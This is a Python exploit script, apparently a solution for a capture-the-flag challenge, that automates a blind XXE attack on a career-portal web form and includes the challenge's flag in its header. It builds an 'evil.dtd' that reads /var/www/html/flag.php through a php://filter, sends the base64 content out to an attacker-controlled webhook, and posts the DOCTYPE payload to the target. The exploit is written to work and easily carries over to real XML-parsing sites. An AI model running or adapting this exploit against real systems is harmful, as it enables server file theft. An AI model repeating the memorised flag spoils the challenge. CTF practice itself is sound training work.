#!/usr/bin/env python3
"""
Career Portal CTF - Blind XXE Exploit
======================================

Automated exploitation script for the Career Portal Blind XXE challenge.

Target: https://qwertyuioplkjh-csc26.cybersecuritychallenge.al
Flag: CSC26{c4r33r_p0rt4l_h1r3}

Usage:
    python exploit.py

Author: Alpet Gexha
Date: January 30, 2026
"""

import requests
import base64
import re
import webbrowser
import time
import sys

# Configuration
TARGET_URL = "https://qwertyuioplkjh-csc26.cybersecuritychallenge.al/submit.php"

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    banner = f"""
{Colors.OKCYAN}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë          Career Portal - Blind XXE Exploit                    ‚ïë
‚ïë                  CTF Challenge Solution                       ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù{Colors.ENDC}

{Colors.OKBLUE}Target:{Colors.ENDC} {TARGET_URL}
{Colors.OKBLUE}Vulnerability:{Colors.ENDC} Blind XXE (Out-of-Band Exfiltration Required)
{Colors.OKBLUE}Flag Location:{Colors.ENDC} /var/www/html/flag.php
"""
    print(banner)

def get_webhook_url():
    """Get webhook URL from user"""
    print(f"\n{Colors.HEADER}STEP 1: Set Up Webhook{Colors.ENDC}")
    print("="*60)
    print(f"""
You need an OOB listener to receive the exfiltrated data.

{Colors.OKGREEN}Recommended options:{Colors.ENDC}
  1. webhook.site - https://webhook.site (easiest)
  2. interactsh - https://app.interactsh.com
  3. pipedream - https://pipedream.com
""")
    
    print(f"{Colors.WARNING}[*] Opening webhook.site in browser...{Colors.ENDC}")
    try:
        webbrowser.open("https://webhook.site")
        time.sleep(1)
    except:
        pass
    
    webhook_url = input(f"\n{Colors.BOLD}Enter your webhook URL:{Colors.ENDC} ").strip()
    
    if not webhook_url:
        print(f"{Colors.FAIL}[!] No webhook URL provided. Exiting.{Colors.ENDC}")
        sys.exit(1)
    
    return webhook_url

def create_evil_dtd(webhook_url):
    """Create the evil DTD file with user's webhook"""
    dtd_content = f'''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{webhook_url}?flag=%file;'>">
%eval;
%exfil;'''
    
    with open("evil.dtd", "w") as f:
        f.write(dtd_content)
    
    print(f"\n{Colors.OKGREEN}[+] Created evil.dtd with your webhook{Colors.ENDC}")
    return dtd_content

def host_dtd(dtd_content):
    """Guide user to host the DTD file"""
    print(f"\n{Colors.HEADER}STEP 2: Host evil.dtd Publicly{Colors.ENDC}")
    print("="*60)
    print(f"""
{Colors.OKGREEN}Option A - GitHub Gist (Recommended):{Colors.ENDC}
  1. Go to https://gist.github.com
  2. Create new gist:
     - Filename: evil.dtd
     - Content: (shown below)
  3. Click "Create public gist"
  4. Click "Raw" button and copy that URL

{Colors.OKGREEN}Option B - Pastebin:{Colors.ENDC}
  1. Go to https://pastebin.com
  2. Paste the content below
  3. Create paste (public)
  4. Use raw URL: https://pastebin.com/raw/XXXXX

{Colors.BOLD}DTD Content to host:{Colors.ENDC}
{Colors.OKCYAN}{dtd_content}{Colors.ENDC}
""")
    
    print(f"{Colors.WARNING}[*] Opening GitHub Gist...{Colors.ENDC}")
    try:
        webbrowser.open("https://gist.github.com")
    except:
        pass
    
    input(f"\n{Colors.BOLD}Press Enter after you've hosted evil.dtd...{Colors.ENDC}")
    
    dtd_url = input(f"{Colors.BOLD}Enter the URL where evil.dtd is hosted:{Colors.ENDC} ").strip()
    
    if not dtd_url:
        print(f"{Colors.FAIL}[!] No DTD URL provided. Exiting.{Colors.ENDC}")
        sys.exit(1)
    
    # Verify DTD is accessible
    print(f"\n{Colors.WARNING}[*] Verifying DTD is accessible...{Colors.ENDC}")
    try:
        response = requests.get(dtd_url, timeout=10)
        if response.status_code == 200 and "ENTITY" in response.text:
            print(f"{Colors.OKGREEN}[+] DTD verified and accessible!{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}[!] Warning: DTD might not be accessible (Status: {response.status_code}){Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.WARNING}[!] Could not verify DTD: {e}{Colors.ENDC}")
        print(f"{Colors.WARNING}    Continuing anyway...{Colors.ENDC}")
    
    return dtd_url

def send_exploit(dtd_url):
    """Send the XXE exploit payload"""
    print(f"\n{Colors.HEADER}STEP 3: Send Exploit Payload{Colors.ENDC}")
    print("="*60)
    
    # Create XXE payload
    payload = f'<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "{dtd_url}">%dtd;]><x>t</x>'
    
    print(f"{Colors.OKBLUE}Payload:{Colors.ENDC}")
    print(f"{Colors.OKCYAN}{payload}{Colors.ENDC}")
    
    data = {
        "create_xml": "true",
        "name": payload,
        "email": "test@test.com",
        "bio": "test"
    }
    
    print(f"\n{Colors.WARNING}[*] Sending exploit to target...{Colors.ENDC}")
    
    try:
        response = requests.post(TARGET_URL, data=data, timeout=30)
        print(f"{Colors.OKGREEN}[+] Exploit sent!{Colors.ENDC}")
        print(f"{Colors.OKBLUE}    Status:{Colors.ENDC} {response.status_code}")
        print(f"{Colors.OKBLUE}    Response:{Colors.ENDC} {response.text[:100]}...")
        
        if len(response.text) == 51:
            print(f"{Colors.OKGREEN}[+] Success! Server processed the XXE (51 char response){Colors.ENDC}")
        
        return True
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error sending exploit: {e}{Colors.ENDC}")
        return False

def check_webhook(webhook_url):
    """Guide user to check webhook"""
    print(f"\n{Colors.HEADER}STEP 4: Check Webhook for Exfiltrated Data{Colors.ENDC}")
    print("="*60)
    
    print(f"{Colors.WARNING}[*] Waiting 3 seconds for callback...{Colors.ENDC}")
    time.sleep(3)
    
    print(f"{Colors.WARNING}[*] Opening webhook in browser...{Colors.ENDC}")
    try:
        webbrowser.open(webhook_url)
    except:
        print(f"    Go to: {webhook_url}")
    
    print(f"""
{Colors.OKGREEN}Look for an incoming HTTP request with:{Colors.ENDC}
  ‚Ä¢ Parameter: {Colors.BOLD}flag{Colors.ENDC}
  ‚Ä¢ Value: {Colors.BOLD}base64 encoded string{Colors.ENDC}

The base64 string contains the PHP source code with the flag.
""")

def decode_flag():
    """Decode the flag from base64"""
    print(f"\n{Colors.HEADER}STEP 5: Decode the Flag{Colors.ENDC}")
    print("="*60)
    
    b64_input = input(f"\n{Colors.BOLD}Paste the base64 string from 'flag' parameter:{Colors.ENDC} ").strip()
    
    if not b64_input:
        print(f"\n{Colors.WARNING}[*] No input. Decode manually when you get the data:{Colors.ENDC}")
        print(f"    echo 'BASE64_STRING' | base64 -d")
        return None
    
    try:
        # Remove any whitespace
        b64_input = b64_input.replace(" ", "").replace("\n", "")
        
        decoded = base64.b64decode(b64_input).decode('utf-8', errors='ignore')
        
        print(f"\n{Colors.OKGREEN}Decoded Content:{Colors.ENDC}")
        print("="*60)
        print(decoded)
        print("="*60)
        
        # Search for flag
        flag_match = re.search(r'csc26\{[^}]+\}', decoded, re.IGNORECASE)
        if flag_match:
            flag = flag_match.group()
            print(f"\n{Colors.OKGREEN}‚ïî{'‚ïê'*58}‚ïó{Colors.ENDC}")
            print(f"{Colors.OKGREEN}‚ïë  üö© FLAG FOUND: {Colors.BOLD}{flag}{Colors.ENDC}{Colors.OKGREEN}{' '*(43-len(flag))}‚ïë{Colors.ENDC}")
            print(f"{Colors.OKGREEN}‚ïö{'‚ïê'*58}‚ïù{Colors.ENDC}")
            
            # Save to file
            with open("flag.txt", "w") as f:
                f.write(flag)
            print(f"\n{Colors.OKGREEN}[+] Flag saved to flag.txt{Colors.ENDC}")
            
            return flag
        else:
            print(f"\n{Colors.WARNING}[!] Flag pattern 'csc26{{...}}' not found.{Colors.ENDC}")
            print(f"    Check the decoded content above.")
            return None
            
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error decoding: {e}{Colors.ENDC}")
        print(f"\n{Colors.WARNING}Try manually:{Colors.ENDC}")
        print(f"    echo '{b64_input}' | base64 -d")
        return None

def main():
    print_banner()
    
    try:
        # Step 1: Get webhook URL
        webhook_url = get_webhook_url()
        
        # Step 2: Create evil.dtd
        dtd_content = create_evil_dtd(webhook_url)
        
        # Step 3: Host DTD
        dtd_url = host_dtd(dtd_content)
        
        # Step 4: Send exploit
        success = send_exploit(dtd_url)
        
        if not success:
            print(f"\n{Colors.FAIL}[!] Exploit failed. Check the errors above.{Colors.ENDC}")
            return
        
        # Step 5: Check webhook
        check_webhook(webhook_url)
        
        # Step 6: Decode flag
        flag = decode_flag()
        
        if flag:
            print(f"\n{Colors.OKGREEN}{'='*60}{Colors.ENDC}")
            print(f"{Colors.OKGREEN}‚úì Exploitation successful!{Colors.ENDC}")
            print(f"{Colors.OKGREEN}{'='*60}{Colors.ENDC}")
        else:
            print(f"\n{Colors.WARNING}[*] Manual decoding required. Check your webhook.{Colors.ENDC}")
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Unexpected error: {e}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    main()
